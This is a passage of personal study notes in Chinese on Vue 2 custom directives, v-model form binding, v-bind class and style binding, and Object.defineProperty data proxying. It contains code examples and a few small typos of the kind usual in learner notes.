在标签属性内部使用 ``<div v-big>`` 传入的数据 会经过 v-big 自定义指令里面的逻辑处理后 展示到 标签体中


**注意:**  
自定义属性传递进来的数据 必须是在组件身上定义过的 比如必须在data身上配置过 因为它也要保证自定义属性 数据的响应式

<br>

### **自定义指令的函数式写法:**
<span v-big='number'></span>

函数式 自定义指令 中的参数
```js
big(element, binding) { }
```

**参数:**  
**<font color="#C2185B">element:</font>**  
当前v-big所在的真实DOM  ``<span></span>`` 也就是Dom节点

**<font color="#C2185B">binding:</font>**   
v-big 所绑定的标签对象 内部有很多的属性
内部属性 binding.value:   
就是标签属性中在使用 v-big 时传递进来的数据(该数据可能在data配置项中)

```js
binding.value == v-big='number' 中的number == data配置项中的 50

data() {
  return {
    number: 50   ===   binding.value
  } 
},
```

<br>
  
### **实现需求1:**
当使用v-big指令的时候 同v-text使用方式一样 将结果x10放到标签体中
```js 
directives: {
  big(el, binding) {

    // 这里也是使用 原生js的方式 写的逻辑
    el.innerHTML = binding.value * 10
  }
}
```

<br>

### **自定义指令 函数式的调用时机**
也就是上面 big函数 什么时候会被调用?
1. 指令与元素成功绑定的时候 *初始的时候*
2. 自定义指令函数中所依赖的数据发生变化的时候 该函数会被重新调用 更加准确的说法是 指令所在的模板重新解析的时候 该函数都会被重新调用

<br>

### **对象式的自定义指令**
```html
<span v-fbind='number'></span>
```

对象式的方式具有像生命周期式的性质 *在下面的3种情况下会被触发*

1. 指令和元素成功绑定
2. 已绑定指令的元素被 挂载 到页面 *好像mounted*
3. 已绑定指令的元素 模版被重新解析 *好像updated*

我们先把函数准备好 vue会在对应的实际调用对应的函数 *下面的函数都能收到 element 和 binding 参数*

```js
directives: {

  自定义指令: {
    // 当指令与元素成功绑定的时该函数会被调用
    bind(el, binding) {}       

    // 指令所在元素被插入页面时该函数会被调用
    inserted(el, binding) {}   

    // 指令在的模板被重新解析时该函数会被调用
    update(el, binding) {}     


    ---

    // 指令所在组件的 VNode 及其子 VNode 全部更新后调用。
    componentUpdated() {}

    // 只调用一次 指令与元素解绑时调用。
    unbind() {}     
  }
}
```

很多情况下 bind函数中的逻辑 和 update函数的逻辑是一样的  
如果我们使用的简写形式 相当于我们使用了bind 和 update 没有使用inserted

*inserted里面一般是做真实能够操作dom元素的逻辑* 比如获取它的父节点等 因为*这个时间点元素已经被挂载到页面上*了

<br>

### **实现需求2:**
定义一个 v-fbind指令 效果和v-bind类似 但可以让其所绑定的input元素默认获取焦点
```html
<input type="text" :value='number'>
```

函数式的方式所产生的问题:
```js
directives: {

  // 错误演示:
  fbind(el, binding) {

    // 将输入框的值 修改为 指定绑定的data中变量所对应的值
    el.value = binding.value

    // 自动获取焦点
    el.focus()
  }
}
```
上面我们获取了 v-fbind 传递的值 赋值给了 el 上 然后期望它能获取焦点 但是我们发现 el.focus() 之后 input并没有获取到焦点 

代码肯定是奏效了 只能说明 执行的时机不对 那 fbind 这个函数是什么时候调用的？  
1. 该指令和元素绑定在一起的时候
2. 该指令处于的模板被重新解析的时候


我们的问题就在问题1 fbind 函数会在 指令和元素绑定的时候 这时候仅仅是在内存里面建立了 绑定关系 并没有跑到页面上 就开始被调用 也就是说在元素挂载到页面之前就执行了 focus() 逻辑 所以是不奏效的

也就是说 el.focus() 这部分的逻辑 要在另一个时机调用


将上面的函数式的写法 修改为 对象式的写法
```js
fbind: {
  bind(el, binding) {
    el.value = binding.value
  },

  insert(el, binding) {
    el.focus()
  },

  // 注意 我们要写update 要不vue不知道我们更新的时候要干什么
  update() {
    el.value = binding.value
  }
}
```

像不像在一个自定义指令中写了3个生命周期函数


**注意:**  
自定义指令的名字 不要使用驼峰命名法 多个单词之间使用-来连接 同时 变量名里面如果使用了 - 我们就要使用引号将它括起来
```js 
v-big-number
'big-number'() { ... }
```

自定义指令的函数中的this(也就是directives里面配置的函数中的this)都是*window*

```
我打印了一下 
函数式的自定义指令中的this是undefined
对象式的自定义指令中的this

20211215 - 额 为什么我现在打印的*都是undefined*
```

我们在directives配置的指令都属于局部指令其它的地方用不了

<br>

### **全局配置 自定义指令: Vue.directive('指令名', {指令的配置对象})**
```js
Vue.directive('fbind', {
  
  bind(el, binding) { 
    el.value = binding.value
  },

  insert(el, binding) {
    el.focus()
  },
  
  update() {
    el.value = binding.value
  }

})
```

<br>

**技巧: 场景描述**  
我们在项目中 会使用 v-html 来渲染字符串中的 "文字文字``<a href>こちら</a>``文字文字"

但是v-html会将字符串解析成 纯html 也就是说 我们要是使用 ``<NuxtLink>`` -> 解析后 ``<nuxtlink>こちら</nuxtlink>``

也就浏览器并不认识的``<NuxtLink>`` 那怎么才能实现 ``<NuxtLink>`` 的功能呢？

<br>

**思路: 利用编程式导航**  
获取 ``<a>`` 的href的属性值 通过 router.push 导航式API 去进行跳转

<br>

**步骤:**  
- 我们 *bind()* 方法中 也就是v-指令与节点 绑定在一起的时候 获取 该元素下的所有 a标签(href的值是以 "/" 开头的) 然后 给它们遍历 绑定 click 事件
- 在 *unbind()* 方法中 解绑 click 事件
- 在 父子组件重新渲染后 依次调用 unbind() 和 bind() 确保先解绑事件后再绑定事件
- click的事件回调中的逻辑是: 看注释部分

<br>

**代码:**  
```js
// plugins/v-content-links.js
import Vue from 'vue'

export default ({ app }) => {
  const pushRoute = ev => {
    const href = ev.currentTarget.getAttribute('href')
    if (!href || href[0] !== '/') return

    // 通过 resolved.matched 属性可以判断我们传入的 href 是否有对应的注册的路由
    const { resolved } = app.router.resolve(href)

    // マッチするルートがあり、パス部分にトレイリングスラッシュがあるなら router.push で遷移する
    // 如果我们传入的路径后面是以 / 结尾的话 取消a的默认行为 通过编程式路由导航的方式跳转页面
    if (resolved.matched.length && resolved.path.slice(-1) === '/') {
      ev.preventDefault()
      
      // resolved 自体を渡したいがトレイリングスラッシュが消えてしまう
      app.router.push(resolved.fullPath)
    }
  }
  const bind = function(el) {
    const internalLinks = el.querySelectorAll('a[href^="/"]')
    for (let i = internalLinks.length; i--;) internalLinks[i].addEventListener('click', pushRoute, false)
  }
  const unbind = function(el) {
    const links = el.getElementsByTagName('a')
    for (let i = links.length; i--;) links[i].removeEventListener('click', pushRoute, false)
  }

  Vue.directive('content-links', {
    bind,
    unbind,
    componentUpdated(el) {
      unbind(el)
      bind(el)
    },
  })
}


// nuxt.config.js
export default {
  plugins: [
    '~/plugins/v-content-links',
  },
}


<div v-html="post.content" v-content-links />
```

参考链接:  

    https://jamblog-beryl.vercel.app/internal-links/

<br>

Vue中的实现方式:
```js
<script>
import router from "../router/"
export default {
  name: "App",
  data() {
    return {
      content: "<router-link>内容</router-link>"
    }
  },
  directives: {
    "custome-link": {
      bind(el, binding) {
        let uri = el.href 
          ? new URL(el.href).pathname 
          : ""
        
        console.log(uri)

        el.addEventListener("click", function(e) {
          e.preventDefault()
          let router = binding.value
          router.push(uri)
        })
      }
    }
  },

}
</script>
```

<br><br>

# 表单数据的 双向绑定 v-model
主要是用来捕获(收集)用户的输入 动态收集到 data 中 也就是说数据不仅能从data流向页面 还可以从页面流向data

在原生的js中当我们要收集表单数据的时候
1. 要么使用js挨个获取
2. 要么使用formData表单对象来获取

在vue中可以很便利的通过 v-model 指令来收集用户在表单上输入的数据

常用的表单类的元素
- input
- radio 
- checkbox
- select
- textarea

这些表单类元素都有一个特殊的值 value 我们 v-model 通常都是绑定在value上的 
```
v-model:value='data中的变量' 

简写:

v-model='data中的变量'
```

因为 v-model *默认收集的就是value的值*

<br>

### **<font color="#C2185B">input: v-model</font>**
v-model只能应用在表单类元素上(输入类元素)上 一般都会绑定value
```html
<input type="text" v-model:value='title'>

<!-- 简写形式 -->
<input type="text" v-model='title'>
```

将用户在这个表单项上的输入 保存到data配置项中的title变量里面


<br>

**要点: v-model在给变量赋值的时候赋值的类型都是 string 类型**

<br>

### **语法:**
```
v-model='data中的变量'
```

<br>

### **v-model 原理:**
v-model其实是一个语法糖, 它的背后本质上是包含两个操作
1. v-bind绑定一个value属性
2. v-on指令给当前元素绑定input事件

```
源码中, v-model 会判断标签的类型 不同的 input类型 对应使用的事件也不一样
```

```html
<input type="text" v-model='message'>

<!-- 等同于 -->

<input 
  type="text" 
  :value='message' 
  v-on:input='message == $event.target.value'
>
```

<br>

**具体操作:**  
1. 首先使用 :value 将message 和 input的value 绑定到一起
```
<input type='text' v-bind:value='message'>
```

2. 接下来我们修改data中的message 也就是实时获取到input中的value的值 赋值给message
实时监听input标签 我们要用到 oninput事件  
input当中的value的值, 我们通过 $event.target.value 来获取

input元素上有一个事件叫 input 用于实时动态监听用户输入的东西 <font color="#C2185B">不用等到失去焦点就会触发</font>  
接下来我们要将用户输入的东西实时的赋值给message 我们要动态的获取input中的value的值

这个value要通过event来获取, 一旦在我们的界面上产生事件之后浏览器就会生成一个event对象, 这个event对象就包含了我们想要的信息
```html
<input 
  type="text" 
  :value='message' 
  v-on:input='valueChange'
/>

<script> 
  // 我们再methods中定义方法
  methods: {
    valueChange(event) {
      this.message = event.target.value;
    }
  }
</script> 
```

**注意:**
- 不要使用v-model绑定props属性 因为props属性是只读的  
子组件修改父组件通过props传递过来的对象中的属性的时候 会影响到父组件中的值 也就是说 修改子组件中的数据 会同步到父组件身上

当我们在子组件中使用v-model绑定的是一个基本数据类型的数据时 当修改的时候会报错

当我们再子组件中使用v-model绑定的是一个对象中的属性的时候
不会报错 但修改的同时 子组件和父组件中使用这个属性的地方都会发生变化

<br>

vue只能浅层次的监视属性改变没有 不能深度监视 当props是一个对象的时候 我们只用v-model绑定props对象里面的一个值 vue是发现不了 但日后可能会出现种种的问题

```
在FTD的项目就会发生这样的现象
中川的目标是在外壳组件中请求数据 将数据通过prop的方式传递到子组件中
在子组件中 使用 数据判断 或 双向绑定 或 将最后的form拿去当发送请求所需要的数据对象 

事实上也不建议这样做 但是中川做的就没问题么？
v-model="form[n.props]"

父组件将请求的数据后的数据对象
      ↘
      通过props传入子组件
            ↘
            子组件使用v-model绑定这个数据对象
                  ↘
                  子组件拿着这个数据对象去渲染表单的默认值和发送请求
```

**原因:**  
可能因为父组件只是请求数据 将最后的数据对象 交给了子组件 并没有在父组件中使用这个数据对象中的属性 所以没有问题 *(猜测)*

<br>

### **<font color="#C2185B">radio: v-model</font>**
简单的复习下:  
radio标签是单选框, 当中必须有name属性才能向服务器进行提交, 往往我们在设置radio标签的时候都是两个radio起一样的name属性值, 这样才能起到互斥的效果
```
互斥的原因:
我们在往服务器提交的时候 用name作为键名 提交的name只能有一个
```

radio这种 用户不能通过敲键盘输入value的 我们需要自己在标签属性中定义value

在使用v-model绑定单选框的时候 要注意: 
1. 单选框组要有 且只有一个name
2. 每一个单选框要 *格外定义一个对应的value*
3. v-model绑定的是name对应的属性值  
这样才能根据用户点击把设定好的value值存到data中的变量中

<br>

**示例:**  
name: 字段名  
v-model: 绑定data中的name对应的字段名 将用户选择的value 同步到该字段里面
```js 
<form>
  性别: 
  男<input type='radio' name='sex' v-model='sex' value='male' > 
  女<input type='radio' name='sex' v-model='sex' value='female'>
</form>

data() {
  return {
    sex:''    // 这里决定设置默认值
  } 
}
```

**注意:**  
原生html中 单选框的默认值 是通过  checked="checked" 添加的 vue中的默认值需要在data中绑定的变量来设置

<br>

### **<font color="#C2185B">checkbox: v-model</font>**
**多选框的情况下:**  
多选的情况下我们需要收集的是value值 是数据 所以我们要是对checkbox这种类型的input 收集数据 要注意以下几点:

1. 用于收集多选框的变量的类型必须是一个 **数组**  
我们要将值收集到data中的哪个变量里面去 hobby的初始值会影响v-model收集回来的数据 如果是一个字符串 会转成false 这样收集的value会是boolean

2. 每一个checkbox里 设置 value属性  
checkbox这种 用户不能敲键盘输入值的 我们需要自己在标签属性中定义value  
checkbox类型的input 如果我们不自己定义value 那么它默认读取的就是 checked 这个值 也就是true 或者 false

```html
<!-- 爱好:  -->
  吃饭<input type='checkbox' value='吃饭' v-model='hobby'> 
  睡觉<input type='checkbox' value='睡觉' v-model='hobby'> 
  打豆豆<input type='checkbox' value='打豆豆' v-model='hobby'>

<script>
  data() {
    return {
      sex:'',
      hobby: []
    }
  }
</script>
```

<br>

**单选框的情况下:**  
我们不需要收集单选框的数据 我们只需要知道是 true 还是 false 就可以 所以我们不用在单选的情况下在标签内部添加value属性  
直接写v-model=结果存放的变量

```js 
  同意<input type='checkbox' v-model='agree'> 

  data() {
    return {
      // 直接同步进来 true false
      agree:'',
    }
  }
```

<br>

### **<font color="#C2185B">select: v-model</font>**
我们要是对select这种类型标签 收集数据 要注意以下几点
1. 给 select标签绑定 v-model = 将数据收集到哪里
2. 第一个 option 可以是value为空 对应的data中对应的变量的初始值也为空

**选择多个值 变量的类型是字符串:**  
```html 
<select v-model='city'>
  <!-- 默认值的部分就好加上 *disabled* -->
  <option disabled value="">请选择</option>   
  <option value="北京">北京</option>
  <option value="上海">上海</option>
  <option value="深圳">深圳</option>
</select>

data() {
  return {
    city: ''
  } 
}
```

<br>

**选择多个值 变量的类型是数组**  
select标签可以指定可以选中多个值 那么 v-model 绑定的是一个数组  
当选中多个值时, 就会将选中额option对应的value添加到数组mySelects中
```js 
//给下拉菜单添加 multiple属性后 就可以选择多个选项, 我们按住ctrl选, 选中的选项对应的value会传递到data中的cars的数组中

<select v-model='cars' multiple>
  <option value="volvo">volvo</option>
  <option value="saab">saab</option>
  <option value="opel">opel</option>
</select>

let vm = new Vue({
  el:'#app',
  data: {
    cars: []
  }
})
```

<br>

### **<font color="#C2185B">component: v-model</font>**
组件上的 v-model
 
HTML 原生的输入元素类型并不总能所有满足需求。比如 *父子组件之间 双向绑定父组件中的数据*  

幸好 Vue 的组件系统允许你创建具有完全自定义行为且可<font color="#C2185B">复用的输入组件</font>。这些输入组件甚至可以和 v-model 一起使用！

组件上的 v-model 相当于 :value + @input 它就是一样的语法糖

比如下面的案例中, 我们在 子组件 上使用了 v-model 可以将用户的输入拿到 父组件中

    用户输入 --> 子组件 -v-model-> 父组件中的变量 

```html
// App.vue
<template>
  <div id="app">
    <h1>自定义组件的v-model</h1>

    <!-- 组件上绑定了 v-model -->
    <BaseInput v-model="message" />

    <!-- 
      相当于 

      <BaseInput 
        :value="message"
        @input="message = val"    
      />
    -->

    <!-- 把收到的数据设置给 message -->
    <p>文字: {{message}}</p>


    <BaseCheckbox v-model="checked" />
    <p>已经赞了: {{checked}}</p>
  </div>
</template>

<script>
export default {
  components: {
    BaseInput,
    BaseCheckbox
  },
  data() {
    return {
      message: "sam",
      checked: true
    }
  }
}
</script>
```

<br>

**要点:**  
- 子组件中 要给 input 上添加 :value + @input
- props配置项 接收 ["value"] 
- 定义 @input 的回调 内部使用 this.$emit("input", e.target.value) 向父组件发射数据

```html
<!-- BaseInput.vue   -->
<template>
  <div>
    <!-- 利用上 props 中的 value -->
    <input type="text" :value="value" @input="handleInput"/>
  </div>
</template>

<script>
  export default {
    props: ["value"],
    methods: {
      // 父组件在子组件上绑定了 @input 所以回调中也要指定 派发事件为 input 和 父组件在子组件标签上绑定的事件保持一致
      handleInput(e) {
        this.$emit("input", e.target.value)
      }
    }
  }
</script>

```

因为 App.vue 中 给 <BaseInput> 绑定了 v-model 
```html
  <!-- 组件上绑定了 v-model -->
  <BaseInput v-model="message" />

  <!-- 相当于 -->

  <BaseInput 
    :value="message"
    @input="message = val"    
  />
```

### **解析:** 
给组件绑定 v-model 相当于 做了两件事情 
:value="message" and @input="message = val" 

**1. :value="message" -> 给 ``<BaseInput>`` 传递了 props (value: message)**  
所以该组件内部要接收props

<br>

**注意:**  
子组件的props中只有 {value: "message对应的值"} 所以我们在子组件中要 声明接收的是value

<br>

**2. 子组件接收props变量, 事件中指定回调, 回调内部派发input事件**  
``@input="message = val"`` 既然父组件在子组件身上绑定 ``@input``
那么子组件就需要在 ``<input>`` 标签上 使用 ``@input="并指定回调"``
在指定的回调中 我们使用 emit("派发父组件在子组件身上绑定的事件", value) 

<br>

**3. emit() 中的第二个参数 也就是value 会赋值给 v-model="绑定的数据"**

**注意:**  
父组件在子组件身上绑定了什么事件 我们就在回调中派发什么事件


### **结果:**
将 子组件中的数据 双向绑定到 父组件中 的data中

示例:
App组件: 
```html
<template>
  <div id="app">
    <h3>App组件</h3>
    <div>
      {{message}}
    </div>

    <div>
      <Child v-model="message"/>
    </div>
  </div>
</template>

<script>
import Child from "./components/Child.vue"
export default {
  name: "App",
  components: {Child},
  data() {
    return {
      message: "default value"
    }
  }
}
</script>
```

Child组件
```html
<template>
  <div>
    <h3>Child组件</h3>
    <hr>
    <input type="text" :value="value" @input="handleInput">
  </div>
</template>

<script>
export default {
  name: "Child",
  props: ["value"],
  mounted() {
    console.log(this)
  },
  methods: {
    handleInput(e) {
      this.$emit("input", e.target.value)
    }
  }
}
</script>
```

<br>

### **model 配置项: 解决 自定义 属性 和 事件**
但是 上面的使用方式 有个问题 就是默认情况下 v-model 会传递props的key为value 监听的事件是input  
但有些场景下 我们希望接收的属性是自定义的 监听的事件也是自定义的 那么我们就要用到下面的知识点

```html
  <BaseInput v-model="message" />

  <!-- 相当于 -->

  <BaseInput 
    :value="message"
    @input="message = val"    
  />
```

v-model 相当于 :value 和 @input 这时候子组件的props中接收到的 就是 value 也就是我们只能声明接收 value
```js
props: ["value"]
```

也就是说 ``<BaseInput v-model="message" /> `` 这种方式传递到子组件中的值的 key 就是 value

那有没有办法 自定义接收的 key 值呢？ 不要再声明接收 value
我们要修改 默认传递到子组件props的key的名字

<br>

### **子组件中的model配置项**  
子组件中通过 model 配置项 修改父组件通过 v-model="val" 传递过来的props中的默认的key值

```js
model: {
  prop: "checked"  // 默认的名字是value
}
```

上面 :value 的部分解决了 还有 @input 的部分

我们的 v-model 默认监听的是 input 事件 但是有些情况 不是input事件 比如 checkbox 它触发的就是 change 事件  
所以我们也要改变下默认的 v-model 的监听事件的类型 也就通过 model 配置项
```js
model: {
  prop: "checked"  // 默认的名字是value
  event: "change"  // 默认是input
}
```

<br>

### **代码部分:**
App
```html
<template>
  <div id="app">
    <h3>App组件</h3>
    <div>
      {{checked}}
    </div>

    <div>
      <Child v-model="checked"/>
    </div>
  </div>
</template>

<script>
import Child from "./components/Child.vue"
export default {
  name: "App",
  components: {Child},
  data() {
    return {
      message: "default value",
      checked: true
    }
  }
}
</script>
```

Child
```html
<template>
  <div>
    <h3>Child组件</h3>
    <hr>
    <input type="checkbox" :checked="checked" @change="handleChange"> 点我
  </div>
</template>

<script>
export default {
  name: "Child", 
  model: {
    prop: "checked",
    event: "change"
  },
  // 还是要声明接收的 但是声明接收的是我们自己定义的 propName
  props: ["checked"],
  mounted() {
    console.log(this)
  },
  methods: {
    handleChange(e) {
      // 既然我们修改了 v-model 默认监听的事件 那么这里就要派发我们修改后的事件
      this.$emit("change", e.target.checked)
    }
  }
}
</script>
```

<br>

### 补充下 form 相关知识
使用form提交页面会刷新 一般我们都是使用ajax页面无刷新的状态请求数据 或者 发送数据

我们点击form标签内部的按钮会后引起默认行为 也就是表单的提交 表单提交后页面会刷新  
form提交的时候 我们可以给form标签绑定submit事件 用于提交数据 同时要注意我们要阻止默认行为

<br>

### v-model的应用: form表单 点击提交收集数据
上面我们将表单内部的所有数据使用v-model绑定在了对应的变量里面 接下来我们就要点击提交按钮来发送请求 但是我们怎么将上面零散的数据 收集在一起呢？

```js 
sex:'',
hobby: [],
city: ''
```

将数据整理到一个userInfo的对象中 例如: html模版中 v-model="userInfo.sex"
```js 
userInfo: {
  sex:'',
  hobby: [],
  city: ''
}

JSON.stringify(this.userInfo)
```

<br>

### **<font color="#C2185B">v-model.lazy</font>**
**作用:**  
v-model的修饰符, 数据在失去焦点 或者 回车时才会更新  

默认情况下, v-model默认是在 **input事件中同步输入框的数据的**, 也就是说, 一旦有数据发生改变对应的data中的数据就会自动发生改变, lazy修饰符可以让数据在 *失去焦点* 或者 *回车* 时才会更新
```html
<input type="text" v-model.lazy='message'>
```

双向绑定的好处是 实时更新 但是 *坏处是改变的频率太高了* 有时候我们希望用户敲下回车或者文本框失去焦点后再保存在message变量里 这样的改变的频率就不那么频繁了 就可以使用这种方式

<br>

### **<font color="#C2185B">v-model.number</font>**
默认情况下form里面用户选择的和输入的都是字符串类型 那我们使用v-model收集到对应变量的数据类型也会是字符串类型  
但是我们收集的数据到最后都会送到服务器然后传到数据库中 比如说年龄 数据库中的年龄字段如果收到字符串类型的数据就会报错

number修饰符可以让 在输入框输入的内容自动转为数字类型
```js 
<input type="number" v-model.number='message'>

type="number"   控制我输入的不能是字母
v-model.number  会将我输入的数字自动转成数字类型
```

<br>

### **<font color="#C2185B">v-model.trim</font>**
如果输入的内容首尾有很多的空格, 通常我们希望将其取出  
trim修饰符可以过滤内容左右两边的空格
```js 
<input type="text" v-model.trim='message'>
```

<br><br>

# 动态绑定属性: v-bind & :attr
动态绑定属性也是数据的单向绑定 *数据只能从data流向页面*  
前面我们学习的指令主要作用是将值插入到我们模板的内容中, 但是除了内容需要动态决定外, 某些属性我们也希望动态来绑定

**作用:**  
动态绑定属性 绑定的属性值会根据data配置项中的值的变化也变化

**技巧:**  
v-bind="对象" 将对象中的属性展开的放在标签属性中
```html
<div v-bind="data"> 相当于 <div name="sam" age="18" address="花果山">
```

<br>

**<font color="#C2185B">v-bind:'属性' = "表达式"</font>**  
**<font color="#C2185B">:'属性' = "表达式"</font>**  
当我们加上v-bind:后面引号中的内容就当做js表达式去执行了 该变量就会去data中去找
```html
<a :href="url">点我跳转到百度</a>
<a :href="url.toUpperCase()">点我跳转到百度</a>
<a :href="Date.now()">点我跳转到百度</a>
```
```js
data: {
  url: 'http://www.baidu.com'
}
```

```js 
// JS部分
const app = new Vue({
  el:'#app',
  // 要是动态的修改src属性, 一般从服务器请求过来的数据都放在data里面, 再通过语法动态的绑定到html中
  data: {
    imgURL: ['./links/1.jpg'],
    aHref: 'https://www.baidu.com'
  }
})

// HTML部分
<div id="app">
  <img v-bind:src="imgURL" alt="">
  <a v-bind:href="aHref">链接</a>
</div> 
```

<br>

### **技巧:**  
我们使用在标签属性中使用 v-bind 绑定一个对象的时候 相当于将一些属性添加到了 标签属性中 相当于在 a标签中 添加了 target 和 rel 属性
```js 
  <a
    v-bind="
      item.blank
        ? { target: '_blank', rel: 'noopener noreferrer' }
        : false
    "
  >
```

<br>

### **使用 v-bind 动态绑定 class属性:**
**<font color="#C2185B">字符串写法:</font>**  
```html
<h2 class='title' :class='mood'></h2>
```

v-bind绑定的class 和 普通class混合使用的时候 vue不会覆盖掉普通的class部分

**场景:**  
样式的类名不确定 适用于动态指定 动态追加class样式
```js 
// 通过v-bind绑定的属性 引号中是表达式 vue在解析的时候将a作为变量去data中找对应的数据
<h2 class='title' :class='mood'></h2>

data: { mood: 'happy' }

// 渲染为
<h2 class='title happy'></h2>
    

// 样式的类名不确定 适用于动态指定: 
methods: {
  changeClass() {
    const arr = [happy, sad, normal]
    const index = Math.floor(Math.random()*3)
    this.mood = arr[index]
  }
}
```

<br>

**<font color="#C2185B">数组写法:</font>**   
```html
<h2 class='title' :class='classArr'></h2>
```

**场景:**  
样式的类名不确定有多少 名字也不确定的时候我们可以用数组的方式 比如获取样式的类名是请求回来的数据  
因为我们将样式的类名维护在一个数组中 数组可以定义在data中 这样我们删除数组中的元素就相当于删除一个类名 push一个元素就相当于添加一个类名 完全是用操作数组的方式控制类名
```js 
  <h2 class='title' :class='classArr'></h2>

  data: { classArr: ['class1', 'class2', 'class3'] }

  methods: {
    changeClass() {
      this.classArr.shift()
      this.classArr.push('class4')
    }
  }
```

<br>

**<font color="#C2185B">对象语法:</font>**   
```html
<h2 v-bind:class='classObj'>
<h2 v-bind:class='{类名: isShow}'>
```

**场景:**  
要绑定的样式 个数确定 名字也确定 要动态的决定用不用 对象的写法适用于 决定改样式显示与否

将样式名: boolean组成一个对象 根据true 和 false 来确定是否应用该样式 我们通过布尔值来控制类名的添加与否 true:添加 false:不添加
```js
  <h2 :class='classObj'></h2>

  data: {
    classObj: {
      calss1: true, 
      class2: false
    }
  }

  methods: {
    changeClass() {
      this.classObj.calss1 = false
    }
  }


  // 写法2
  <h2 :class='{类名:isShow}'></h2>
```

<br>

如果类名添加与否的条件太过复杂 可以将classObj定义为一个计算属性
```js
<div :class="classObject"></div>

data() {
  return {
    isActive: true,
    error: null
  }
},

computed: {
  classObject() {
    return {
      active: this.isActive && !this.error,
      'text-danger': this.error && this.error.type === 'fatal'
    }
  }
}
```


### **总结:**
以后实际开发中, 固定要有的class我们用普通的写法, 如果以后需要动态修改的class我们使用v-bind的方式

<br>

### **案例1: 点击按钮后改变文字颜色 再次点击复原**
单独的使用条件控制一个class是否显示
```js 
<div id='app'>
  <h2 v-bind:class='{active:isActive}'>{{message}}</h2>
  <button v-on:click='btnClick'>Send</button>
</div>

let app = new Vue({
  el:'#app',
  data: {
      message: '你好啊',
      isActive: true
  },
  methods: {
    btnClick: function() {
      this.isAcitve = !this.isActive;
    }
  }
});


<style>
  .active { background: red }
</style>
```

<br>

### **案例2: 点击对应选项变色, 其它选项复原**
**需求:**  
点击列表中的哪一项, 那么该项的文字变成红色

**思路:**  
既然class是通过布尔值决定添加与否的, 那么就让它的值是个判断表达式{active:currentIndex == index} 每次点击的时候 我把index传递给currentIndex 让他们相等
```html
<div id="app">
  <ul>
    <!-- 哪个是多条v-for就写在哪里 -->
    <li v-bind:class='{active:currentIndex == index}' v-for='(item, index) in movies' v-on:click='change(index)'>{{item}}</li>
  </ul>
</div>

<script>
const app = new Vue({
  el:'#app',
  data: {
    movies: ['海王', '海尔兄弟', '火影忍者', '进击的巨人'],

    // 这里我们维护一个 currentIndex
    currentIndex:undefined
  },
  methods: {
    // 标签中通过实参把index 传递进来, 每次点击就把这个index 赋值给currentIndex
    change: function(index) {
      this.currentIndex = index;
    }
  }
})
</script>
```

**解析一下:**  
首先我们class的添加与否 是跟true 和 false 有关系的 v-bind:class='{active:currentIndex == index}'  
我们在data:{ currentIndex = 0 }

```html
  <li :class='{active: 0 === currentIndex}'>    // true 所以添加 
  <li :class='{active: 1 === 0}'>
  <li :class='{active: 2 === 0}'>
```

<br>

### **使用 v-bind 动态绑定 style属性:**
我们能发现style指定内联样式的时候 style 也是kv成对出现的  
因为引号中的部分是表达式 如果当中出现了变量(fsize)就是去组件实例身上找
```html
<div :style:'{fontSize: fsize + "px"}'></div>
```

动态绑定style的好处就是我们不用操作dom通过操作data中的变量就可以达到修改内联样式的效果

**注意:**  
我们再书写css属性名的时候, 使用驼峰式写法 或者短横线分隔

<br>

**<font color="#C2185B">对象写法:</font>**  
```html
<!-- 我们将对样式的处理也放在data中定义一个对象 -->
<div :style='{styleObj}'>style的测试段落</div>

<script>
data() {
  return {
    styleObj: {
      fontSize: '40px'
    }
  }
}
</script>
```

**使用场景:**
以后我们在开发项目的时候, 会把网页中的一个部分一个部分开发成一个个的组件, 这样别的页面就可以拿来复用, 
但是组件的颜色之类的就不能写死, 因为有的页面可能要求是白色 有的页面可以会是绿色, 所以我们要根据用的人决定是什么样的颜色, 这时候我们就要动态的绑定样式 

<br>

**<font color="#C2185B">数组写法:</font>**  
```html
<h2 :style='[变量名1, 变量名2]'>{{message}}</h2>
```

我们传递进去的是一个数组 数组中对应的样式都会出现在class里面 成并列关系 也就是数组里面配置样式对象 

```html 
<h2 :style='[baseStyle1, baseStyle2]'>{{message}}</h2>

<script>
  const vm = new Vue({
    el: '#app',
    data: {
      baseStyle1:{ background:'red' },
      baseStyle2:{ fontSize:'50px' },
    }
  })
</script>


// 最终效果会合并到一起
<h2 style='background:'red'; fontSize:'50px''>{{message}}</h2>
```

**总结:**  
我们使用v-bind绑定样式 把不变化的样式正常写 变化的样式使用:style来指定 动态的数据都往data里面放

<br><br>

# Vue中的数据代理

**<font color="#C2185B">Object.defineProperty(指定对象, '属性名', {配置参数}): </font>**  
该方法在vue底层很多地方都被使用 数据代理 数据劫持 计算属性等  
使用该方法给一个对象添加属性 并对该属性进行限制 / 更改  
使用该方法添加的属性 默认是不能被枚举 不能被删除 不能被修改的  

**参数:**   
- 给哪个对象添加属性
- 给这个对象添加什么属性
- 配置对象

<br>

**配置对象: 基本配置**  
- value:        
  属性值

- enumerable:   
  true / 默认值: false    枚举

- writable:     
  true / 默认值: false    重写

- configurable: 
  true / 默认值: false    删除

<br>

**配置对象: 高级配置**  
- enumerable:   
  true / 默认值: false

- configurable:  
  true / 默认值: false

- get:  
  该方法会在 设置的属性 被读取的时候调用 该函数必须有返回值(return) 返回值为该属性的属性值

- set:  
  该方法会在 设置的属性 被修改的时候调用 该函数会接收到参数 参数为被修改后的值
  参数为 newValue

```
对 get 和 set 的理解 
get:  我们给一个对象使用defineproperty方法添加了属性名 但是值去哪取？ 靠get
      get负责去一个地方得到值

set:  那修改该值的话靠set 改成啥还可以影响到get return那个值(根源)
```

<br>

### **示例:**
需求: 定义一个人的对象 这个人的对需要有age属性 但是age属性是靠number的值确定的 且每当number的值被修改的时候 person里面的age也会被修改
```js 
let number = 18

let person = {
  name: 'sam',
  sex: '男',
}

Object.defineProperty(person, 'age', {

  // 当有人读取person的age属性的时候 该函数就会被调用 且返回值就是age的值 属性值 它必须有返回值
  get() {
    return number
  },

  // 当有人修改person的age属性时 set函数就会被调用 且会收到age被修改为的具体值
  set(value) {
    console.log('age的值被修改为: ', value)

    // 把修改后的值 赋值给age的根源number 这样当我们修改age的 值的时候也能够影响到number
    number = value
  }
})
```

这样 age的值就是number的值 每当读取age的时候就会去调用getter 然后重新得到number最新的值   
number 和 person 明明是两个东西 但是借助defineproperty方法产生了关联  
上面的person通过这个方法确实有age属性但是 *你现用我现取* 想取去靠get 相当于去哪取 想改靠set 改成啥 还可以影响那个根源的值

```js 
let person = {
  name: "sam",
  sex: "男"
}

// 定义监视变量的源
let watchNum = 0

// 定义一个受监视的变量
Object.defineProperty(person, "age", {
  get() {
    return watchNum
